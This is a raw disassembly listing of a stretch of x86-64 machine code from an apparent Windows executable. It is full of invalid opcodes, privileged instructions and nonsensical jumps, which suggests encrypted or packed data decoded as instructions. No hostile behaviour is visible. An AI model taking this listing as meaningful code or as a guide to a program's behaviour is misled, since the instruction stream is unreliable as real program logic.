   1400015ad:	cb                   	lret
   1400015ae:	4b 2b 64 9b 0c       	sub    0xc(%r11,%r11,4),%rsp
   1400015b3:	35 d3 86 cd 31       	xor    $0x31cd86d3,%eax
   1400015b8:	0a a0 8e 3c bd bd    	or     -0x4242c372(%rax),%ah
   1400015be:	4f 38 70 db          	rex.WRXB cmp %r14b,-0x25(%r8)
   1400015c2:	11 4c c7 c6          	adc    %ecx,-0x3a(%rdi,%rax,8)
   1400015c6:	d0 48 1e             	rorb   $1,0x1e(%rax)
   1400015c9:	e0 93                	loopne 0x14000155e
   1400015cb:	45 a9 fd 52 41 ac    	rex.RB test $0xac4152fd,%eax
   1400015d1:	ad                   	lods   (%rsi),%eax
   1400015d2:	15 5f 1b b0 d4       	adc    $0xd4b01b5f,%eax
   1400015d7:	5b                   	pop    %rbx
   1400015d8:	c2 96 97             	ret    $0x9796
   1400015db:	56                   	push   %rsi
   1400015dc:	75 8b                	jne    0x140001569
   1400015de:	56                   	push   %rsi
   1400015df:	52                   	push   %rdx
   1400015e0:	c8 36 19 6a          	enter  $0x1936,$0x6a
   1400015e4:	7f 2b                	jg     0x140001611
   1400015e6:	d8 6e a6             	fsubrs -0x5a(%rsi)
   1400015e9:	0d 9b 63 11 10       	or     $0x1011639b,%eax
   1400015ee:	5a                   	pop    %rdx
   1400015ef:	67 14 40             	addr32 adc $0x40,%al
   1400015f2:	1d 79 a3 5d dc       	sbb    $0xdc5da379,%eax
   1400015f7:	7d 7a                	jge    0x140001673
   1400015f9:	7b 9f                	jnp    0x14000159a
   1400015fb:	70 cd                	jo     0x1400015ca
   1400015fd:	66 5e                	pop    %si
   1400015ff:	74 e0                	je     0x1400015e1
   140001601:	b6 23                	mov    $0x23,%dh
   140001603:	98                   	cwtl
   140001604:	57                   	push   %rdi
   140001605:	ab                   	stos   %eax,(%rdi)
   140001606:	e2 9c                	loop   0x1400015a4
   140001608:	8e 8d a1 91 39 90    	mov    -0x6fc66e5f(%rbp),%cs
   14000160e:	60                   	(bad)
   14000160f:	95                   	xchg   %eax,%ebp
   140001610:	3c c0                	cmp    $0xc0,%al
   140001612:	27                   	(bad)
   140001613:	8b 8b dd e6 8f 52    	mov    0x528fe6dd(%rbx),%ecx
   140001619:	fb                   	sti
   14000161a:	a5                   	movsl  (%rsi),(%rdi)
   14000161b:	82                   	(bad)
   14000161c:	e5 e6                	in     $0xe6,%eax
   14000161e:	64 86 58 5b          	xchg   %bl,%fs:0x5b(%rax)
   140001622:	2b be ef 46 ea ba    	sub    -0x4515b911(%rsi),%edi
   140001628:	36 60                	ss (bad)
   14000162a:	a9 b7 81 7d 68       	test   $0x687d81b7,%eax
   14000162f:	b3 84                	mov    $0x84,%bl
   140001631:	2d 2f ad 33 30       	sub    $0x3033ad2f,%eax
   140001636:	ee                   	out    %al,(%dx)
   140001637:	a9 ea 16 ad a4       	test   $0xa4ad16ea,%eax
   14000163c:	5d                   	pop    %rbp
   14000163d:	0b 6c a0 90          	or     -0x70(%rax,%riz,4),%ebp
   140001641:	6d                   	insl   (%dx),(%rdi)
   140001642:	32 d4                	xor    %ah,%dl
   140001644:	27                   	(bad)
   140001645:	70 f3                	jo     0x14000163a
   140001647:	d0 fe                	sar    $1,%dh
   140001649:	56                   	push   %rsi
   14000164a:	b0 dd                	mov    $0xdd,%al
   14000164c:	49                   	rex.WB
   14000164d:	4b 71 d9             	rex.WXB jno 0x140001629
   140001650:	4c 1b 36             	sbb    (%rsi),%r14
   140001653:	c7                   	(bad)
   140001654:	fb                   	sti
   140001655:	06                   	(bad)
   140001656:	f7 c3 22 20 b4 ce    	test   $0xceb42022,%ebx
   14000165c:	95                   	xchg   %eax,%ebp
   14000165d:	3d 75 ca 28 80       	cmp    $0x8028ca75,%eax
   140001662:	3a f2                	cmp    %dl,%dh
   140001664:	9f                   	lahf
   140001665:	9d                   	popf
   140001666:	fb                   	sti
   140001667:	f6 46 bb b8          	testb  $0xb8,-0x45(%rsi)
   14000166b:	fb                   	sti
   14000166c:	f1                   	int1
   14000166d:	a6                   	cmpsb  (%rdi),(%rsi)
   14000166e:	79 ff                	jns    0x14000166f
   140001670:	f4                   	hlt
   140001671:	f6 3e                	idivb  (%rsi)
   140001673:	e1 43                	loope  0x1400016b8
   140001675:	eb ff                	jmp    0x140001676
   140001677:	e5 9a                	in     $0x9a,%eax
   140001679:	cd bc                	int    $0xbc
   14000167b:	e8 2d d0 7d ec       	call   0x12c7de6ad
   140001680:	77 70                	ja     0x1400016f2
   140001682:	86 34 c0             	xchg   %dh,(%rax,%rax,8)
   140001685:	6d                   	insl   (%dx),(%rdi)
   140001686:	47 30 19             	rex.RXB xor %r11b,(%r9)
   140001689:	4b 04 3d             	rex.WXB add $0x3d,%al
   14000168c:	ae                   	scas   (%rdi),%al
   14000168d:	56                   	push   %rsi
   14000168e:	c5 39 ab             	(bad)
   140001691:	06                   	(bad)
   140001692:	82                   	(bad)
   140001693:	27                   	(bad)
   140001694:	1c 1b                	sbb    $0x1b,%al
   140001696:	43 23 c5             	rex.XB and %r13d,%eax
   140001699:	3d 00 2e 72 20       	cmp    $0x20722e00,%eax
   14000169e:	c1 2a cf             	shrl   $0xcf,(%rdx)
   1400016a1:	9d                   	popf
   1400016a2:	8e 12                	mov    (%rdx),%ss
   1400016a4:	78 80                	js     0x140001626
   1400016a6:	4f 16                	rex.WRXB (bad)
   1400016a8:	a1 a6 0c 1b 16 bb cd 	movabs 0x131fcdbb161b0ca6,%eax
   1400016af:	1f 13 
   1400016b1:	eb 8a                	jmp    0x14000163d
   1400016b3:	01 a4 f6 4b 05 7d d0 	add    %esp,-0x2f82fab5(%rsi,%rsi,8)
   1400016ba:	08 08                	or     %cl,(%rax)
   1400016bc:	ca cd c9             	lret   $0xc9cd
   1400016bf:	0c 07                	or     $0x7,%al
   1400016c1:	ab                   	stos   %eax,(%rdi)
   1400016c2:	97                   	xchg   %eax,%edi
   1400016c3:	78 b0                	js     0x140001675
   1400016c5:	b6 56                	mov    $0x56,%dh
   1400016c7:	7c 69                	jl     0x140001732
   1400016c9:	90                   	nop
   1400016ca:	15 71 de 8d d4       	adc    $0xd48dde71,%eax
   1400016cf:	75 db                	jne    0x1400016ac
   1400016d1:	dd 93 6b 6c c0 52    	fstl   0x52c06c6b(%rbx)
   1400016d7:	6f                   	outsl  (%rsi),(%dx)
   1400016d8:	b5 e6                	mov    $0xe6,%ch
   1400016da:	11 62 02             	adc    %esp,0x2(%rdx)
   1400016dd:	fb                   	sti
   1400016de:	d0 66 bf             	shlb   $1,-0x41(%rsi)
   1400016e1:	46 9f                	rex.RX lahf
   1400016e3:	5e                   	pop    %rsi
   1400016e4:	08 5b 5e             	or     %bl,0x5e(%rbx)
   1400016e7:	5a                   	pop    %rdx
   1400016e8:	d1 7d 1d             	sarl   $1,0x1d(%rbp)
   1400016eb:	57                   	push   %rdi
   1400016ec:	66 60                	data16 (bad)
   1400016ee:	dc 53 63             	fcoml  0x63(%rbx)
   1400016f1:	30 9b 4d d4 2d 5a    	xor    %bl,0x5a2dd44d(%rbx)
   1400016f7:	49 0d 0b 19 44 ba    	rex.WB or $0xffffffffba44190b,%rax
   1400016fd:	16                   	(bad)
   1400016fe:	d8 40 97             	fadds  -0x69(%rax)
   140001701:	c6                   	(bad)
   140001702:	a5                   	movsl  (%rsi),(%rdi)
   140001703:	ac                   	lods   (%rsi),%al
   140001704:	20 db                	and    %bl,%bl
   140001706:	64 a8 f9             	fs test $0xf9,%al
   140001709:	fd                   	std
   14000170a:	27                   	(bad)
   14000170b:	a5                   	movsl  (%rsi),(%rdi)
   14000170c:	4e e0 e6             	rex.WRX loopne 0x1400016f5
   14000170f:	a1 4b b0 a1 bf fc ad 	movabs 0xbb60adfcbfa1b04b,%eax
   140001716:	60 bb 
   140001718:	25 8b 23 b6 92       	and    $0x92b6238b,%eax
   14000171d:	96                   	xchg   %eax,%esi
   14000171e:	e2 b2                	loop   0x1400016d2
   140001720:	2f                   	(bad)
   140001721:	2b ad 8a 98 36 6c    	sub    0x6c36988a(%rbp),%ebp
   140001727:	8e 41 10             	mov    0x10(%rcx),%es
   14000172a:	2f                   	(bad)
   14000172b:	83 f6 0d             	xor    $0xd,%esi
   14000172e:	ee                   	out    %al,(%dx)
   14000172f:	87 f3                	xchg   %esi,%ebx
   140001731:	5d                   	pop    %rbp
   140001732:	a9 99 44 40 68       	test   $0x68404499,%eax
   140001737:	9d                   	popf
   140001738:	9d                   	popf
   140001739:	66 2b 90 2a 7b ea 94 	sub    -0x6b1584d6(%rax),%dx
   140001740:	e7 1d                	out    %eax,$0x1d
   140001742:	b4 e0                	mov    $0xe0,%ah
   140001744:	50                   	push   %rax
   140001745:	00 75 e4             	add    %dh,-0x1c(%rbp)
   140001748:	89 26                	mov    %esp,(%rsi)
   14000174a:	36 e9 3e 3b f7 ed    	ss jmp 0x12df7528e
   140001750:	3b 6b b0             	cmp    -0x50(%rbx),%ebp
   140001753:	f3 8c 76 71          	repz mov %?,0x71(%rsi)
   140001757:	f7 55 50             	notl   0x50(%rbp)
   14000175a:	32 fa                	xor    %dl,%bh
   14000175c:	e2 4d                	loop   0x1400017ab
   14000175e:	f3 fe                	repz (bad)
   140001760:	5f                   	pop    %rdi
   140001761:	f0 bc c6 e8 ed 7d    	lock mov $0x7dede8c6,%esp
   140001767:	c2 31 cb             	ret    $0xcb31
   14000176a:	3e cf                	ds iret
   14000176c:	86 d6                	xchg   %dl,%dh
   14000176e:	ff cb                	dec    %ebx
   140001770:	83 86 b8 d5 34 9b 79 	addl   $0x79,-0x64cb2a48(%rsi)
   140001777:	d1 ed                	shr    $1,%ebp
   140001779:	bd 3a dc 5a a0       	mov    $0xa05adc3a,%ebp
   14000177e:	fb                   	sti
   14000177f:	d8 ee                	fsubr  %st(6),%st
   140001781:	e0 0c                	loopne 0x14000178f
   140001783:	69 59 fd cd 6d 80 db 	imul   $0xdb806dcd,-0x3(%rcx),%ebx
   14000178a:	8e 60 37             	mov    0x37(%rax),%fs
   14000178d:	c6                   	(bad)
   14000178e:	4f                   	rex.WRXB
   14000178f:	64 32 96 08 7a 85 8b 	xor    %fs:-0x747a85f8(%rsi),%dl
   140001796:	c9                   	leave
   140001797:	7e 5c                	jle    0x1400017f5
   140001799:	ad                   	lods   (%rsi),%eax
   14000179a:	8a 73 eb             	mov    -0x15(%rbx),%dh
   14000179d:	b0 4b                	mov    $0x4b,%al
   14000179f:	77 56                	ja     0x1400017f7
   1400017a1:	0d 04 4f e1 10       	or     $0x10e14f04,%eax
   1400017a6:	c5 4b 38             	(bad)
   1400017a9:	36 86 46 8f          	ss xchg %al,-0x71(%rsi)
   1400017ad:	2b 47 42             	sub    0x42(%rdi),%eax
   1400017b0:	8a 7b 00             	mov    0x0(%rbx),%bh
   1400017b3:	5c                   	pop    %rsp
   1400017b4:	3d 66 c1 58 e4       	cmp    $0xe458c166,%eax
   1400017b9:	40 82                	rex (bad)
   1400017bb:	55                   	push   %rbp
   1400017bc:	53                   	push   %rbx
   1400017bd:	5d                   	pop    %rbp
   1400017be:	43 51                	rex.XB push %r9
   1400017c0:	9e                   	sahf
   1400017c1:	3b 1d 25 29 26 dc    	cmp    -0x23d9d6db(%rip),%ebx        # 0x11c2640ec
   1400017c7:	21 f0                	and    %esi,%eax
   1400017c9:	00 9f 2c 47 1d 5e    	add    %bl,0x5e1d472c(%rdi)
   1400017cf:	28 42 4d             	sub    %al,0x4d(%rdx)
   1400017d2:	19 36                	sbb    %esi,(%rsi)
   1400017d4:	f5                   	cmc
   1400017d5:	50                   	push   %rax
   1400017d6:	d8 32                	fdivs  (%rdx)
   1400017d8:	2c 76                	sub    $0x76,%al
   1400017da:	9b                   	fwait
   1400017db:	3f                   	(bad)
   1400017dc:	9b                   	fwait
   1400017dd:	6b 5a 3b 26          	imul   $0x26,0x3b(%rdx),%ebx
   1400017e1:	d6                   	udb
   1400017e2:	15 03 91 cb d4       	adc    $0xd4cb9103,%eax
   1400017e7:	07                   	(bad)
   1400017e8:	48 ed                	rex.W in (%dx),%eax
   1400017ea:	97                   	xchg   %eax,%edi
   1400017eb:	0a ff                	or     %bh,%bh
   1400017ed:	f0 56                	lock push %rsi
   1400017ef:	0e                   	(bad)
   1400017f0:	fa                   	cli
   1400017f1:	a0 11 10 4d bd d0 14 	movabs 0x9b9414d0bd4d1011,%al
   1400017f8:	94 9b 
   1400017fa:	93                   	xchg   %eax,%ebx
   1400017fb:	19 23                	sbb    %esp,(%rbx)
   1400017fd:	86 52 1d             	xchg   %dl,0x1d(%rdx)
   140001800:	0e                   	(bad)
   140001801:	56                   	push   %rsi
   140001802:	2f                   	(bad)
   140001803:	f1                   	int1
   140001804:	b9 4b ee f5 60       	mov    $0x60f5ee4b,%ecx
   140001809:	6d                   	insl   (%dx),(%rdi)
   14000180a:	ad                   	lods   (%rsi),%eax
   14000180b:	f8                   	clc
   14000180c:	d7                   	xlat   (%rbx)
   14000180d:	70 6c                	jo     0x14000187b
   14000180f:	fc                   	cld
   140001810:	d2 20                	shlb   %cl,(%rax)
   140001812:	2b e2                	sub    %edx,%esp
   140001814:	65 3d ea e6 bc 1b    	gs cmp $0x1bbce6ea,%eax
   14000181a:	a9 eb 0b 06 68       	test   $0x68060beb,%eax
   14000181f:	ef                   	out    %eax,(%dx)
   140001820:	b6 bb                	mov    $0xbb,%dh
   140001822:	27                   	(bad)
   140001823:	d7                   	xlat   (%rbx)
   140001824:	01 a6 e6 d3 d8 80    	add    %esp,-0x7f272c1a(%rsi)
   14000182a:	a5                   	movsl  (%rsi),(%rdi)
   14000182b:	de 6f 9d             	fisubrs -0x63(%rdi)
   14000182e:	64 da 6a cd          	fisubrl %fs:-0x33(%rdx)
   140001832:	23 c4                	and    %esp,%eax
   140001834:	dd d0                	fst    %st(0)
   140001836:	e2 c0                	loop   0x1400017f8
   140001838:	04 f6                	add    $0xf6,%al
   14000183a:	a1 cd b3 eb 60 c9 7e 	movabs 0x3e8d7ec960ebb3cd,%eax
   140001841:	8d 3e 
   140001843:	bd c9 90 ff b9       	mov    $0xb9ff90c9,%ebp
   140001848:	10 b6 bc b4 a7 ab    	adc    %dh,-0x54584b44(%rsi)
   14000184e:	7d b0                	jge    0x140001800
   140001850:	a2 fb 3a ae 15 e6 fb 	movabs %al,0xccaafbe615ae3afb
   140001857:	aa cc 
   140001859:	c0 b8 a7 7b dd 79 a3 	sarb   $0xa3,0x79dd7ba7(%rax)
   140001860:	c6                   	(bad)
   140001861:	60                   	(bad)
   140001862:	36 9b                	ss fwait
   140001864:	71 7d                	jno    0x1400018e3
   140001866:	f7 9f a8 5b b4 92    	negl   -0x6d4ba458(%rdi)
   14000186c:	1f                   	(bad)
   14000186d:	46 75 96             	rex.RX jne 0x140001806
   140001870:	1a 16                	sbb    (%rsi),%dl
   140001872:	32 88 ad 0b f3 8c    	xor    -0x730cf453(%rax),%cl
   140001878:	74 2d                	je     0x1400018a7
   14000187a:	b0 81                	mov    $0x81,%al
   14000187c:	c3                   	ret
   14000187d:	30 71 85             	xor    %dh,-0x7b(%rcx)
   140001880:	99                   	cltd
   140001881:	90                   	nop
   140001882:	8a 5d 2e             	mov    0x2e(%rbp),%bl
   140001885:	8d 4b 59             	lea    0x59(%rbx),%ecx
   140001888:	f7 ab 08 54 40 b6    	imull  -0x49bfabf8(%rbx)
   14000188e:	c9                   	leave
   14000188f:	50                   	push   %rax
   140001890:	45 e6 8e             	rex.RB out %al,$0x8e
   140001893:	4e                   	rex.WRX
   140001894:	f2 fb                	repnz sti
   140001896:	4f                   	rex.WRXB
   140001897:	4a 2b dd             	rex.WX sub %rbp,%rbx
   14000189a:	0c 47                	or     $0x47,%al
   14000189c:	9c                   	pushf
   14000189d:	c0 cd 43             	ror    $0x43,%ch
   1400018a0:	21 7d 82             	and    %edi,-0x7e(%rbp)
   1400018a3:	7b 96                	jnp    0x14000183b
   1400018a5:	60                   	(bad)
   1400018a6:	43 7f 4f             	rex.XB jg 0x1400018f8
   1400018a9:	46 00 72 f8          	rex.RX add %r14b,-0x8(%rdx)
   1400018ad:	5b                   	pop    %rbx
   1400018ae:	c1 76 fd 0b          	shll   $0xb,-0x3(%rsi)
   1400018b2:	86 68 4a             	xchg   %ch,0x4a(%rax)
   1400018b5:	16                   	(bad)
   1400018b6:	47 6c                	rex.RXB insb (%dx),(%rdi)
   1400018b8:	93                   	xchg   %eax,%ebx
   1400018b9:	30 04 61             	xor    %al,(%rcx,%riz,2)
   1400018bc:	24 2d                	and    $0x2d,%al
   1400018be:	c5 65 e9 4b 9b       	vpsubsw -0x65(%rbx),%ymm3,%ymm9
   1400018c3:	11 5e 56             	adc    %ebx,0x56(%rsi)
   1400018c6:	5a                   	pop    %rdx
   1400018c7:	15 87 70 19 18       	adc    $0x18197087,%eax
   1400018cc:	30 6d d8             	xor    %ch,-0x28(%rbp)
   1400018cf:	1c 35                	sbb    $0x35,%al
   1400018d1:	3d 9f 02 82 20       	cmp    $0x2082029f,%eax
   1400018d6:	5e                   	pop    %rsi
   1400018d7:	06                   	(bad)
   1400018d8:	5b                   	pop    %rbx
   1400018d9:	06                   	(bad)
   1400018da:	1d 0b ec 1b dc       	sbb    $0xdc1bec0b,%eax
   1400018df:	0f 51 a6 93 37 e6 bb 	sqrtps -0x4419c86d(%rsi),%xmm4
   1400018e6:	52                   	push   %rdx
   1400018e7:	33 3f                	xor    (%rdi),%edi
   1400018e9:	9d                   	popf
   1400018ea:	11 3e                	adc    %edi,(%rsi)
   1400018ec:	88 80 d0 3a 8d d0    	mov    %al,-0x2f72c530(%rax)
   1400018f2:	97                   	xchg   %eax,%edi
   1400018f3:	24 3a                	and    $0x3a,%al
   1400018f5:	cd 56                	int    $0x56
   1400018f7:	20 e3                	and    %ah,%bl
   1400018f9:	eb 15                	jmp    0x140001910
   1400018fb:	2d 54 f6 d4 29       	sub    $0x29d4f654,%eax
   140001900:	79 26                	jns    0x140001928
   140001902:	a9 c5 ce 3b 68       	test   $0x683bcec5,%eax
   140001907:	c1 17 1d             	rcll   $0x1d,(%rdi)
   14000190a:	2b cc                	sub    %esp,%ecx
   14000190c:	a0 00 ea c8 a5 50 ad 	movabs 0x12d6ad50a5c8ea00,%al
   140001913:	d6 12 
   140001915:	4d 6c                	rex.WRB insb (%dx),(%rdi)
   140001917:	d2 cb                	ror    %cl,%bl
   140001919:	6b 2f df             	imul   $0xffffffdf,(%rdi),%ebp
   14000191c:	7c 76                	jl     0x140001994
   14000191e:	ee                   	out    %al,(%dx)
   14000191f:	db c1                	fcmovnb %st(1),%st
   140001921:	cb                   	lret
   140001922:	a1 e3 76 d6 60 e7 af 	movabs 0x23f0afe760d676e3,%eax
   140001929:	f0 23 
   14000192b:	ea                   	(bad)
   14000192c:	18 ed                	sbb    %ch,%ch
   14000192e:	e2 ee                	loop   0x14000191e
   140001930:	1d bd a5 f0 aa       	sbb    $0xaaf0a5bd,%eax
   140001935:	a0 64 f4 73 86 27 f9 	movabs 0x9bc4f9278673f464,%al
   14000193c:	c4 9b 
   14000193e:	e6 fd                	out    %al,$0xfd
   140001940:	09 fd                	or     %edi,%ebp
   140001942:	b8 89 be e0 79       	mov    $0x79e0be89,%eax
   140001947:	8d 67 c6             	lea    -0x3a(%rdi),%esp
   14000194a:	3a 80 d0 db fb 84    	cmp    -0x7b042430(%rax),%al
   140001950:	d5 8b bc 9a 62 96 7d 	{rex2 0x8b} bsf -0x6182699e(%r10),%rbx
   140001957:	9e 
   140001958:	bb b0 3e 93 0c       	mov    $0xc933eb0,%ebx
   14000195d:	ad                   	lods   (%rsi),%eax
   14000195e:	ff 97 b1 10 b0 af    	call   *-0x504fef4f(%rdi)
   140001964:	06                   	(bad)
   140001965:	0d 71 ab df 2b       	or     $0x2bdfab71,%eax
   14000196a:	32 a6 68 36 f3 a2    	xor    -0x5d0cc998(%rsi),%ah
   140001970:	6d                   	insl   (%dx),(%rdi)
   140001971:	66 b4 bc             	data16 mov $0xbc,%ah
   140001974:	da 7b 75             	fidivrl 0x75(%rbx)
   140001977:	b8 03 5d 36 b5       	mov    $0xb5365d03,%eax
   14000197c:	b4 40                	mov    $0x40,%ah
   14000197e:	f7 b1 98 2f 8a 42    	divl   0x428a2f98(%rcx)
   140001984:	22 ae 28 d7 91 44    	and    0x4491d728(%rsi),%ch
   14000198a:	37                   	(bad)
   14000198b:	71 cd                	jno    0x14000195a
   14000198d:	65 ef                	gs out %eax,(%dx)
   14000198f:	23 cf                	and    %edi,%ecx
   140001991:	fb                   	sti
   140001992:	c0 b5 2f 3b 4d ec a5 	shlb   $0xa5,-0x13b2c4d1(%rbp)
   140001999:	db b5 e9 bc db 89    	(bad) -0x76244317(%rbp)
   14000199f:	81 5b c2 56 39 38 b5 	sbbl   $0xb5383956,-0x3e(%rbx)
   1400019a6:	48                   	rex.W
   1400019a7:	f3 f1                	repz int1
   1400019a9:	11 f1                	adc    %esi,%ecx
   1400019ab:	59                   	pop    %rcx
   1400019ac:	19 d0                	sbb    %edx,%eax
   1400019ae:	05 b6 a4 82 3f       	add    $0x3f82a4b6,%eax
   1400019b3:	92                   	xchg   %eax,%edx
   1400019b4:	9b                   	fwait
   1400019b5:	4f 19 af d5 5e 1c ab 	rex.WRXB sbb %r13,-0x54e3a12b(%r15)
   1400019bc:	18 81 6d da 98 aa    	sbb    %al,-0x55672593(%rcx)
   1400019c2:	07                   	(bad)
   1400019c3:	d8 42 02             	fadds  0x2(%rdx)
   1400019c6:	03 a3 01 5b 83 12    	add    0x12835b01(%rbx),%esp
   1400019cc:	be 6f 70 45 be       	mov    $0xbe45706f,%esi
   1400019d1:	85 31                	test   %esi,(%rcx)
   1400019d3:	24 8c                	and    $0x8c,%al
   1400019d5:	b2 e4                	mov    $0xe4,%dl
   1400019d7:	4e c3                	rex.WRX ret
   1400019d9:	7d 0c                	jge    0x1400019e7
   1400019db:	55                   	push   %rbp
   1400019dc:	e2 b4                	loop   0x140001992
   1400019de:	ff d5                	call   *%rbp
   1400019e0:	74 5d                	je     0x140001a3f
   1400019e2:	be 72 6f 89 7b       	mov    $0x7b896f72,%esi
   1400019e7:	f2 fe                	repnz (bad)
   1400019e9:	b1 de                	mov    $0xde,%cl
   1400019eb:	80 b1 96 16 3b a7 06 	xorb   $0x6,-0x58c4e96a(%rcx)
   1400019f2:	dc 9b 35 12 c7 25    	fcompl 0x25c71235(%rbx)
   1400019f8:	74 f1                	je     0x1400019eb
   1400019fa:	9b                   	fwait
   1400019fb:	c1 94 26 69 cf c1 69 	rcll   $0x9b,0x69c1cf69(%rsi,%riz,1)
   140001a02:	9b 
   140001a03:	e4 d2                	in     $0xd2,%al
   140001a05:	4a f1                	rex.WX int1
   140001a07:	9e                   	sahf
   140001a08:	86 47 be             	xchg   %al,-0x42(%rdi)
   140001a0b:	ef                   	out    %eax,(%dx)
   140001a0c:	e3 25                	jrcxz  0x140001a33
   140001a0e:	4f 38 c6             	rex.WRXB cmp %r8b,%r14b
   140001a11:	9d                   	popf
   140001a12:	c1 0f b5             	rorl   $0xb5,(%rdi)
   140001a15:	d5 8c 8b             	(bad)
   140001a18:	cc                   	int3
   140001a19:	a1 0c 24 65 9c ac 77 	movabs 0x2c6f77ac9c65240c,%eax
   140001a20:	6f 2c 
   140001a22:	e9 2d 75 02 2b       	jmp    0x16b028f54
   140001a27:	59                   	pop    %rcx
   140001a28:	aa                   	stos   %al,(%rdi)
   140001a29:	84 74 4a 83          	test   %dh,-0x7d(%rdx,%rcx,2)
   140001a2d:	e4 a6                	in     $0xa6,%al
   140001a2f:	6e                   	outsb  (%rsi),(%dx)
   140001a30:	dc a9 b0 5c d4 fb    	fsubrl -0x42ba350(%rcx)
   140001a36:	41 bd da 88 f9 76    	mov    $0x76f988da,%r13d
   140001a3c:	b5 53                	mov    $0x53,%ch
   140001a3e:	11 83 52 51 3e 98    	adc    %eax,-0x67c1aeae(%rbx)
   140001a44:	ab                   	stos   %eax,(%rdi)
   140001a45:	df 66 ee             	fbld   -0x12(%rsi)
   140001a48:	6d                   	insl   (%dx),(%rdi)
   140001a49:	c6                   	(bad)
   140001a4a:	31 a8 10 32 b4 2d    	xor    %ebp,0x2db43210(%rax)
   140001a50:	c8 27 03 b0          	enter  $0x327,$0xb0
   140001a54:	3f                   	(bad)
   140001a55:	21 fb                	and    %edi,%ebx
   140001a57:	98                   	cwtl
   140001a58:	c7                   	(bad)
   140001a59:	7f 59                	jg     0x140001ab4
   140001a5b:	bf e4 0e ef be       	mov    $0xbeef0ee4,%edi
   140001a60:	f3 0b e0             	repz or %eax,%esp
   140001a63:	c6 c2 8f             	mov    $0x8f,%dl
   140001a66:	a8 3d                	test   $0x3d,%al
   140001a68:	47 91                	rex.RXB xchg %eax,%r9d
   140001a6a:	a7                   	cmpsl  (%rdi),(%rsi)
   140001a6b:	d5 25 a7             	(bad)
   140001a6e:	0a 93 51 63 ca 06    	or     0x6ca6351(%rbx),%dl
   140001a74:	6f                   	outsl  (%rsi),(%dx)
   140001a75:	82                   	(bad)
   140001a76:	03 e0                	add    %eax,%esp
   140001a78:	67 29 29             	sub    %ebp,(%ecx)
   140001a7b:	14 70                	adc    $0x70,%al
   140001a7d:	6e                   	outsb  (%rsi),(%dx)
   140001a7e:	0e                   	(bad)
   140001a7f:	0a 85 0a b7 27 fc    	or     -0x3d848f6(%rbp),%al
   140001a85:	2f                   	(bad)
   140001a86:	d2 46 38             	rolb   %cl,0x38(%rsi)
   140001a89:	21 1b                	and    %ebx,(%rbx)
   140001a8b:	2e 26 c9             	cs es leave
   140001a8e:	26 5c                	es pop %rsp
   140001a90:	fc                   	cld
   140001a91:	6d                   	insl   (%dx),(%rdi)
   140001a92:	2c 4d                	sub    $0x4d,%al
   140001a94:	ed                   	in     (%dx),%eax
   140001a95:	2a c4                	sub    %ah,%al
   140001a97:	5a                   	pop    %rdx
   140001a98:	13 0d 38 53 df b3    	adc    -0x4c20acc8(%rip),%ecx        # 0xf3df6dd6
   140001a9e:	95                   	xchg   %eax,%ebp
   140001a9f:	9d                   	popf
   140001aa0:	54                   	push   %rsp
   140001aa1:	73 0a                	jae    0x140001aad
   140001aa3:	65 de 63 af          	fisubs %gs:-0x51(%rbx)
   140001aa7:	8b bb 0a 6a 76 a8    	mov    -0x578995f6(%rbx),%edi
   140001aad:	b2 77                	mov    $0x77,%dl
   140001aaf:	3c 2e                	cmp    $0x2e,%al
   140001ab1:	c9                   	leave
   140001ab2:	c2 81 e6             	ret    $0xe681
   140001ab5:	ae                   	scas   (%rdi),%al
   140001ab6:	ed                   	in     (%dx),%eax
   140001ab7:	47 85 2c 72          	test   %r13d,(%r10,%r14,2)
   140001abb:	92                   	xchg   %eax,%edx
   140001abc:	3b 35 82 14 a1 e8    	cmp    -0x175eeb7e(%rip),%esi        # 0x128a12f44
   140001ac2:	bf a2 64 03 f1       	mov    $0xf10364a2,%edi
   140001ac7:	4c                   	rex.WR
   140001ac8:	4b                   	rex.WXB
   140001ac9:	66 1a a8 01 30 42 bc 	data16 sbb -0x43bdcfff(%rax),%ch
   140001ad0:	70 8b                	jo     0x140001a5d
   140001ad2:	4b c2 91 97          	rex.WXB ret $0x9791
   140001ad6:	f8                   	clc
   140001ad7:	d0 a3 51 6c c7 30    	shlb   $1,0x30c76c51(%rbx)
   140001add:	be 54 06 19 e8       	mov    $0xe8190654,%esi
   140001ae2:	92                   	xchg   %eax,%edx
   140001ae3:	d1 18                	rcrl   $1,(%rax)
   140001ae5:	52                   	push   %rdx
   140001ae6:	ef                   	out    %eax,(%dx)
   140001ae7:	d6                   	udb
   140001ae8:	24 06                	and    $0x6,%al
   140001aea:	99                   	cltd
   140001aeb:	d6                   	udb
   140001aec:	10 a9 65 55 85 35    	adc    %ch,0x35855565(%rcx)
   140001af2:	0e                   	(bad)
   140001af3:	f4                   	hlt
   140001af4:	2a 20                	sub    (%rax),%ah
   140001af6:	71 57                	jno    0x140001b4f
   140001af8:	70 a0                	jo     0x140001a9a
   140001afa:	6a 10                	push   $0x10
   140001afc:	b8 d1 bb 32 16       	mov    $0x1632bbd1,%eax
   140001b01:	c1 a4 19 c8 d0 d2 b8 	shll   $0x8,-0x472d2f38(%rcx,%rbx,1)
   140001b08:	08 
   140001b09:	6c                   	insb   (%dx),(%rdi)
   140001b0a:	37                   	(bad)
   140001b0b:	1e                   	(bad)
   140001b0c:	53                   	push   %rbx
   140001b0d:	ab                   	stos   %eax,(%rdi)
   140001b0e:	41 51                	push   %r9
   140001b10:	4c 77 48             	rex.WR ja 0x140001b5b
   140001b13:	27                   	(bad)
   140001b14:	99                   	cltd
   140001b15:	eb 8e                	jmp    0x140001aa5
   140001b17:	df b5 bc b0 34 a8    	fbstp  -0x57cb4f44(%rbp)
   140001b1d:	48                   	rex.W
   140001b1e:	9b                   	fwait
   140001b1f:	e1 b3                	loope  0x140001ad4
   140001b21:	0c 1c                	or     $0x1c,%al
   140001b23:	39 63 5a             	cmp    %esp,0x5a(%rbx)
   140001b26:	c9                   	leave
   140001b27:	c5 4a aa             	(bad)
   140001b2a:	d8 4e cb             	fmuls  -0x35(%rsi)
   140001b2d:	8a 41 e3             	mov    -0x1d(%rcx),%al
   140001b30:	4f ca 9c 5b          	rex.WRXB lretq $0x5b9c
   140001b34:	73 e3                	jae    0x140001b19
   140001b36:	63 77 f3             	movsxd -0xd(%rdi),%esi
   140001b39:	6f                   	outsl  (%rsi),(%dx)
   140001b3a:	2e 68 a3 b8 b2 d6    	cs push $0xffffffffd6b2b8a3
   140001b40:	ee                   	out    %al,(%dx)
   140001b41:	82                   	(bad)
   140001b42:	8f                   	(bad)
   140001b43:	74 fc                	je     0x140001b41
   140001b45:	b2 ef                	mov    $0xef,%dl
